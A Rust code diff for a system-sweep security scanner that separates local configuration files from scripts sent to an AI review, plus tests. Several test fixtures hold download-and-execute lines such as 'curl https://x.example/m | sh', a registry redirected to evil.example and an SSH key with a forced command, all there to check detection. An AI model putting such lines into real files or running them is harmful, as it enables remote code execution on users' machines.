@@ -5,7 +5,7 @@
 
 use std::fmt::Write as _;
 
-use super::collect::{Body, Collection, Item};
+use super::collect::{self, Body, Collection, Item};
 use super::commands;
 use super::tier::Tier;
 use crate::autorun::Category;
@@ -50,6 +50,31 @@ pub fn judge(
     news: &std::collections::HashSet<String>,
 ) -> Report {
     let mut report = review::collected_report("system sweep", context);
+    let facts = examine(&mut report, collection, home, news);
+    let context = ReviewContext {
+        context: &facts,
+        ..*context
+    };
+    let units = Identity::parse(IDENTITY)
+        .map(|identity| {
+            vec![Unit {
+                prefix: String::new(),
+                identity,
+            }]
+        })
+        .unwrap_or_default();
+    review::review_collected(report, &context, &units)
+}
+
+/// Puts what the local checks say of `collection` into `report`, queues
+/// for the AI review the text that goes to it, and returns what Guardian
+/// established about each such item (see `fact`).
+fn examine(
+    report: &mut Report,
+    collection: &Collection,
+    home: Option<&str>,
+    news: &std::collections::HashSet<String>,
+) -> Vec<String> {
     let mut facts = Vec::new();
     for item in collection.items.iter().filter(|item| !item.is_trusted()) {
         let label = label(item, home);
@@ -77,24 +102,24 @@ pub fn judge(
             report.gaps.extend(
                 item.notes
                     .iter()
-                    .filter_map(|note| note.strip_prefix(super::collect::NOT_ALL_FOLLOWED))
+                    .filter_map(|note| note.strip_prefix(collect::NOT_ALL_FOLLOWED))
                     .map(|limit| Gap::Sweep(format!("{label}: not followed past {limit}"))),
             );
         }
         match &item.body {
             Body::Text(text) if is_local_only(item, home) => {
                 report.text_files_reviewed += 1;
-                local_checks(&mut report, item, &label, text);
+                local_checks(report, item, &label, text);
             }
             Body::Text(text) => {
                 let before = report.findings.len();
                 // Reviewed, and sent to the AI, without the values that
                 // look like secrets.
                 let text = without_secrets(text);
-                review::analyze_text(&mut report, &label, &text, false);
+                review::analyze_text(report, &label, &text, false);
                 // Every item is persistence already; naming another start-up
                 // file (`.bash_profile` sourcing `.bashrc`) is not news.
-                drop_rule(&mut report, before, RuleId::PersistenceModification);
+                drop_rule(report, before, RuleId::PersistenceModification);
                 facts.push(fact(item, &label));
             }
             Body::Binary(format) => {
@@ -119,19 +144,7 @@ pub fn judge(
             Body::Link(_) => {}
         }
     }
-    let context = ReviewContext {
-        context: &facts,
-        ..*context
-    };
-    let units = Identity::parse(IDENTITY)
-        .map(|identity| {
-            vec![Unit {
-                prefix: String::new(),
-                identity,
-            }]
-        })
-        .unwrap_or_default();
-    review::review_collected(report, &context, &units)
+    facts
 }
 
 /// Developer tool configuration that holds no tokens as a rule, and whose
@@ -150,24 +163,43 @@ const REVIEWED_TOOL_FILES: &[&str] = &[
 /// yarn, bun and Go keep registry tokens there), an editor's settings and
 /// fish's saved variables. Accounts, keys, trust anchors and `/etc/hosts`
 /// are facts the local checks cover; there is nothing in them to review.
+///
 /// A program one of these files runs is no such file: it is reviewed like
-/// any other.
+/// any other, by the local rules and the AI. For the SSH and git files
+/// that means: the catalogued file, what it is a link to and what an
+/// `Include` reads in are configuration and stay here (the collector
+/// marks the latter two, see `collect::configuration_of`); a script a
+/// `ProxyCommand` or git's `sshCommand` names is a program, whichever
+/// category it was found through. The same holds for every kind of file
+/// kept here: what a catalogued link leads to (`~/.npmrc` kept in a
+/// dotfiles directory) is that file under another name and stays here,
+/// and what it runs is a program.
 fn is_local_only(item: &Item, home: Option<&str>) -> bool {
-    let in_home = home
+    // The catalogued file itself, or what stands for it: where its link
+    // leads, or what it reads in as more of itself.
+    let of = collect::configuration_of(item);
+    let named = item.run_by.is_none() || of.is_some();
+    // A home's file wherever it is kept: a `~/.gitconfig` that is a link
+    // to a file on another mount is that home's configuration still.
+    let in_home = [Some(item.path.as_str()), of]
         .into_iter()
-        .chain([ROOT_HOME])
-        .any(|home| item.path.starts_with(&format!("{home}/")));
-    let name = item.path.rsplit('/').next().unwrap_or_default();
-    let named = item.run_by.is_none();
+        .flatten()
+        .any(|path| {
+            home.into_iter()
+                .chain([ROOT_HOME])
+                .any(|home| path.starts_with(&format!("{home}/")))
+        });
+    let path = collect::stands_for(item);
+    let name = path.rsplit('/').next().unwrap_or_default();
     match item.category {
-        Category::Ssh | Category::Git => in_home,
+        Category::Ssh | Category::Git => in_home && named,
         Category::Account => true,
         Category::Trust => named,
         Category::Toolchain => {
             named
                 && !REVIEWED_TOOL_FILES
                     .iter()
-                    .any(|reviewed| item.path.ends_with(reviewed))
+                    .any(|reviewed| path.ends_with(reviewed))
         }
         Category::Editor => named && name == "settings.json",
         Category::Shell => named && name == "fish_variables",
@@ -389,7 +421,12 @@ fn local_checks(report: &mut Report, item: &Item, label: &str, text: &str) {
     if item.category != Category::Ssh {
         return;
     }
-    let name = item.path.rsplit('/').next().unwrap_or_default();
+    // A linked file is the file its link stands for: `~/.ssh/rc` kept in
+    // a dotfiles directory is still what the server runs at login.
+    let name = collect::stands_for(item)
+        .rsplit('/')
+        .next()
+        .unwrap_or_default();
     if name == "rc" {
         report
             .findings
@@ -535,8 +572,12 @@ mod tests {
     use crate::autorun::Category;
     use crate::report::Report;
     use crate::rules::RuleId;
-    use crate::sweep::collect::{Body, Item, Origin};
+    use std::collections::HashSet;
+
+    use crate::sweep::collect::{self, Body, Collection, Item, Origin, Scope};
+    use crate::sweep::index::PackageIndex;
     use crate::sweep::tier::Tier;
+    use crate::test_support::TempDir;
 
     fn item(path: &str, category: Category, tier: Tier) -> Item {
         Item {
@@ -606,6 +647,405 @@ mod tests {
             "Include /tmp/x\nProxyCommand /tmp/y\n",
         );
         assert!(report.findings.is_empty());
+    }
+
+    #[test]
+    fn a_script_an_ssh_or_git_file_runs_is_reviewed_and_what_it_includes_is_not_sent() {
+        use std::collections::HashSet;
+        use std::fs;
+        use std::os::unix::fs::symlink;
+
+        use crate::sweep::collect::{self, Scope};
+        use crate::sweep::index::PackageIndex;
+        use crate::test_support::TempDir;
+
+        let dir = TempDir::new("sweep-ssh-runs");
+        let root = dir.path();
+        let write = |path: &str, text: &str| {
+            fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
+            fs::write(root.join(path), text).unwrap();
+        };
+        write(
+            "home/u/.ssh/config",
+            "Include ~/work/ssh-hosts\nInclude ~/work/both\nHost x\n  User secret-name\n  ProxyCommand ~/bin/proxy.sh %h\nHost y\n  ProxyCommand ~/work/both\n",
+        );
+        write("home/u/work/ssh-hosts", "Host internal\n  User me\n");
+        // Named by an `Include` and run by a `ProxyCommand`: a program.
+        write("home/u/work/both", "curl https://x.example/b | sh\n");
+        write(
+            "home/u/bin/proxy.sh",
+            "#!/bin/sh\ncurl https://x.example/p | sh\n",
+        );
+        // The catalogued file as a link into a dotfiles directory.
+        write(
+            "home/u/dotfiles/gitconfig",
+            "[core]\n\tsshCommand = ~/bin/git-ssh.sh\n",
+        );
+        symlink("dotfiles/gitconfig", root.join("home/u/.gitconfig")).unwrap();
+        write(
+            "home/u/bin/git-ssh.sh",
+            "#!/bin/sh\ncurl https://x.example/g | sh\n",
+        );
+        let index = PackageIndex::with_foreign(HashSet::new());
+        let home = Some("home/u");
+        let scope = Scope {
+            root,
+            home,
+            index: &index,
+            origin: Origin::System,
+        };
+        let collection = collect::collect(&scope);
+        let found = |path: &str| {
+            collection
+                .items
+                .iter()
+                .find(|item| item.path == path)
+                .unwrap_or_else(|| panic!("{path} was not collected"))
+        };
+        // Configuration: the catalogued file, what an `Include` reads in
+        // and what the catalogued link leads to.
+        for path in [
+            "home/u/.ssh/config",
+            "home/u/work/ssh-hosts",
+            "home/u/dotfiles/gitconfig",
+        ] {
+            assert!(is_local_only(found(path), home), "{path}");
+        }
+        assert_eq!(
+            collect::configuration_of(found("home/u/work/ssh-hosts")),
+            Some("home/u/.ssh/config")
+        );
+        // Programs: what a command of those files names.
+        for path in [
+            "home/u/bin/proxy.sh",
+            "home/u/bin/git-ssh.sh",
+            "home/u/work/both",
+        ] {
+            assert!(!is_local_only(found(path), home), "{path}");
+        }
+
+        let mut report = Report::new("t");
+        super::examine(&mut report, &collection, home, &HashSet::new());
+        let sent: Vec<&str> = report
+            .agent_input
+            .iter()
+            .map(|file| file.path.as_str())
+            .collect();
+        for script in ["~/bin/proxy.sh", "~/bin/git-ssh.sh", "~/work/both"] {
+            assert!(sent.contains(&script), "{script} not queued: {sent:?}");
+            assert!(
+                report
+                    .findings
+                    .iter()
+                    .any(|finding| finding.path == script
+                        && finding.rule == RuleId::DownloadAndExecute),
+                "{script}: {:?}",
+                report.findings
+            );
+        }
+        // The configuration files of the home never go.
+        for kept in ["~/.ssh/config", "~/work/ssh-hosts", "~/dotfiles/gitconfig"] {
+            assert!(!sent.contains(&kept), "{kept} was queued");
+        }
+        assert!(
+            !report
+                .agent_input
+                .iter()
+                .any(|file| file.content.contains("secret-name"))
+        );
+    }
+
+    #[test]
+    fn a_linked_token_file_stays_here_like_the_file_it_stands_for() {
+        use std::collections::HashSet;
+        use std::fs;
+        use std::os::unix::fs::symlink;
+
+        use crate::sweep::collect::{self, Scope};
+        use crate::sweep::index::PackageIndex;
+        use crate::test_support::TempDir;
+
+        let dir = TempDir::new("sweep-linked-tokens");
+        let root = dir.path();
+        let write = |path: &str, text: &str| {
+            fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
+            fs::write(root.join(path), text).unwrap();
+        };
+        // A dotfile manager keeps the real files under other names.
+        write(
+            "home/u/dotfiles/npmrc",
+            "//registry.npmjs.org/:_authToken=npm_SECRETTOKEN0123456789\nregistry=https://evil.example/\nscript-shell=~/bin/npm-shell.sh\n",
+        );
+        symlink("dotfiles/npmrc", root.join("home/u/.npmrc")).unwrap();
+        write(
+            "home/u/bin/npm-shell.sh",
+            "#!/bin/sh\ncurl https://x.example/n | sh\n",
+        );
+        write(
+            "home/u/dotfiles/vscode.json",
+            "{\n  \"http.proxyStrictSSL\": false,\n  \"some.token\": \"ghp_SECRETTOKEN0123456789\"\n}\n",
+        );
+        fs::create_dir_all(root.join("home/u/.config/Code/User")).unwrap();
+        symlink(
+            "../../../dotfiles/vscode.json",
+            root.join("home/u/.config/Code/User/settings.json"),
+        )
+        .unwrap();
+        let index = PackageIndex::with_foreign(HashSet::new());
+        let home = Some("home/u");
+        let scope = Scope {
+            root,
+            home,
+            index: &index,
+            origin: Origin::System,
+        };
+        let collection = collect::collect(&scope);
+        let found = |path: &str| {
+            collection
+                .items
+                .iter()
+                .find(|item| item.path == path)
+                .unwrap_or_else(|| panic!("{path} was not collected"))
+        };
+        for target in ["home/u/dotfiles/npmrc", "home/u/dotfiles/vscode.json"] {
+            let item = found(target);
+            assert!(is_local_only(item, home), "{target}");
+            // Read by the rules of the file it stands for.
+            assert!(
+                item.alerts
+                    .iter()
+                    .any(|(rule, _)| *rule == RuleId::RiskyConfiguration),
+                "{target}: {:?}",
+                item.alerts
+            );
+        }
+        // What such a file runs is a program.
+        assert!(!is_local_only(found("home/u/bin/npm-shell.sh"), home));
+
+        let mut report = Report::new("t");
+        super::examine(&mut report, &collection, home, &HashSet::new());
+        let sent: Vec<&str> = report
+            .agent_input
+            .iter()
+            .map(|file| file.path.as_str())
+            .collect();
+        assert_eq!(sent, ["~/bin/npm-shell.sh"]);
+        assert!(
+            !report
+                .agent_input
+                .iter()
+                .any(|file| file.content.contains("SECRETTOKEN"))
+        );
+        for (path, rule) in [
+            ("~/dotfiles/npmrc", RuleId::RiskyConfiguration),
+            ("~/dotfiles/vscode.json", RuleId::RiskyConfiguration),
+            ("~/bin/npm-shell.sh", RuleId::DownloadAndExecute),
+        ] {
+            assert!(
+                report
+                    .findings
+                    .iter()
+                    .any(|finding| finding.path == path && finding.rule == rule),
+                "{path}: {:?}",
+                report.findings
+            );
+        }
+    }
+
+    /// A fixture home: files, and links by their target's text.
+    fn planted(name: &str, files: &[(&str, &str)], links: &[(&str, &str)]) -> TempDir {
+        let dir = TempDir::new(name);
+        for (path, text) in files {
+            let path = dir.path().join(path);
+            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+            std::fs::write(path, text).unwrap();
+        }
+        for (link, target) in links {
+            let link = dir.path().join(link);
+            std::fs::create_dir_all(link.parent().unwrap()).unwrap();
+            std::os::unix::fs::symlink(target, link).unwrap();
+        }
+        dir
+    }
+
+    /// The paths queued for the AI and the findings of one examination.
+    fn examined(collection: &Collection) -> (Vec<String>, Vec<(String, RuleId)>) {
+        let mut report = Report::new("t");
+        super::examine(&mut report, collection, Some("home/u"), &HashSet::new());
+        (
+            report
+                .agent_input
+                .iter()
+                .map(|file| file.path.clone())
+                .collect(),
+            report
+                .findings
+                .iter()
+                .map(|finding| (finding.path.clone(), finding.rule))
+                .collect(),
+        )
+    }
+
+    #[test]
+    fn a_file_something_runs_is_reviewed_however_else_it_was_reached() {
+        let dir = planted(
+            "sweep-run-wins",
+            &[
+                (
+                    "home/u/bin/miner.sh",
+                    "#!/bin/sh\ncurl https://x.example/m | sh\n",
+                ),
+                ("home/u/work/hosts", "curl https://x.example/h | sh\n"),
+                ("home/u/.ssh/config", "Include ~/work/hosts\n"),
+                (
+                    "home/u/.ssh/config.d/extra",
+                    "curl https://x.example/e | sh\n",
+                ),
+            ],
+            &[("home/u/.yarnrc", "bin/miner.sh")],
+        );
+        let index = PackageIndex::with_foreign(HashSet::new());
+        let home = Some("home/u");
+        let scope = Scope {
+            root: dir.path(),
+            home,
+            index: &index,
+            origin: Origin::System,
+        };
+        let scripts = [
+            "home/u/bin/miner.sh",
+            "home/u/work/hosts",
+            "home/u/.ssh/config.d/extra",
+        ];
+        // Reached as configuration alone, each stays here.
+        let mut collection = collect::collect(&scope);
+        for path in scripts {
+            let item = collection.items.iter().find(|item| item.path == path);
+            assert!(is_local_only(item.unwrap(), home), "{path}");
+        }
+        assert!(examined(&collection).0.is_empty());
+        // A live check finds each of them running.
+        let running = scripts
+            .iter()
+            .map(|path| collect::item(&scope, Category::Process, (*path).to_string(), None))
+            .collect();
+        collect::merge(&mut collection, running);
+        let (sent, findings) = examined(&collection);
+        for (path, label) in
+            scripts
+                .iter()
+                .zip(["~/bin/miner.sh", "~/work/hosts", "~/.ssh/config.d/extra"])
+        {
+            let item = collection.items.iter().find(|item| item.path == *path);
+            let item = item.unwrap();
+            assert_eq!(item.category, Category::Process, "{path}");
+            assert!(!is_local_only(item, home), "{path}");
+            assert!(
+                findings.contains(&(label.to_string(), RuleId::DownloadAndExecute)),
+                "{label}: {findings:?}"
+            );
+        }
+        // `~/.ssh` is a path whose files are withheld from the AI by name.
+        assert_eq!(sent, ["~/bin/miner.sh", "~/work/hosts"]);
+    }
+
+    #[test]
+    fn a_linked_ssh_file_is_read_under_the_name_its_link_stands_for() {
+        let blob = "AAAAC3NzaC1lZDI1NTE5AAAAIGuardianTestKeyMaterial0123456789abcdefghi";
+        let dir = planted(
+            "sweep-linked-ssh",
+            &[
+                ("home/u/dotfiles/sshrc", "curl https://x.example/r | sh\n"),
+                (
+                    "home/u/dotfiles/keys",
+                    &format!("command=\"/tmp/x\" ssh-ed25519 {blob} evil\n"),
+                ),
+                // Kept outside the home: on another mount, say.
+                (
+                    "mnt/dot/gitconfig",
+                    "[user]\n\temail = someone@example.org\n[http]\n\textraHeader = Authorization: Bearer SECRETTOKEN0123456789\n",
+                ),
+                ("mnt/dot/sshconfig", "Host internal\n  User secret-name\n"),
+            ],
+            &[
+                ("home/u/.ssh/rc", "../dotfiles/sshrc"),
+                ("home/u/.ssh/authorized_keys", "../dotfiles/keys"),
+                ("home/u/.gitconfig", "/mnt/dot/gitconfig"),
+                ("home/u/.ssh/config", "/mnt/dot/sshconfig"),
+            ],
+        );
+        let index = PackageIndex::with_foreign(HashSet::new());
+        let home = Some("home/u");
+        let scope = Scope {
+            root: dir.path(),
+            home,
+            index: &index,
+            origin: Origin::System,
+        };
+        let collection = collect::collect(&scope);
+        for path in [
+            "home/u/dotfiles/sshrc",
+            "home/u/dotfiles/keys",
+            "mnt/dot/gitconfig",
+            "mnt/dot/sshconfig",
+        ] {
+            let item = collection.items.iter().find(|item| item.path == path);
+            assert!(is_local_only(item.unwrap(), home), "{path}");
+        }
+        let (sent, findings) = examined(&collection);
+        assert!(sent.is_empty(), "{sent:?}");
+        // The login script and the key's option, as for the files unlinked.
+        for label in ["~/dotfiles/sshrc", "~/dotfiles/keys"] {
+            assert!(
+                findings.contains(&(label.to_string(), RuleId::SshCommand)),
+                "{label}: {findings:?}"
+            );
+        }
+        // And the key is listed, under the file the server reads.
+        let key = collection
+            .items
+            .iter()
+            .find(|item| item.path.starts_with("home/u/.ssh/authorized_keys#"))
+            .expect("the linked key file's key is listed");
+        assert_eq!(key.alerts[0].0, RuleId::SshCommand);
+    }
+
+    #[test]
+    fn a_script_reads_nothing_in_as_configuration() {
+        let dir = planted(
+            "sweep-script-include",
+            &[
+                ("home/u/.ssh/config", "Host x\n  ProxyCommand ~/bin/p.sh\n"),
+                (
+                    "home/u/bin/p.sh",
+                    "#!/bin/sh\ninclude() { . \"$1\"; }\ninclude /home/u/lib/second.sh\n",
+                ),
+                ("home/u/lib/second.sh", "curl https://x.example/s | sh\n"),
+                // A script that is itself a link: what it leads to is run.
+                ("home/u/lib/real.sh", "curl https://x.example/l | sh\n"),
+                (
+                    "home/u/.gitconfig",
+                    "[core]\n\tsshCommand = ~/bin/linked.sh\n",
+                ),
+            ],
+            &[("home/u/bin/linked.sh", "../lib/real.sh")],
+        );
+        let index = PackageIndex::with_foreign(HashSet::new());
+        let scope = Scope {
+            root: dir.path(),
+            home: Some("home/u"),
+            index: &index,
+            origin: Origin::System,
+        };
+        let collection = collect::collect(&scope);
+        let (sent, findings) = examined(&collection);
+        for label in ["~/lib/second.sh", "~/lib/real.sh"] {
+            assert!(sent.contains(&label.to_string()), "{label}: {sent:?}");
+            assert!(
+                findings.contains(&(label.to_string(), RuleId::DownloadAndExecute)),
+                "{label}: {findings:?}"
+            );
+        }
     }
 
     #[test]
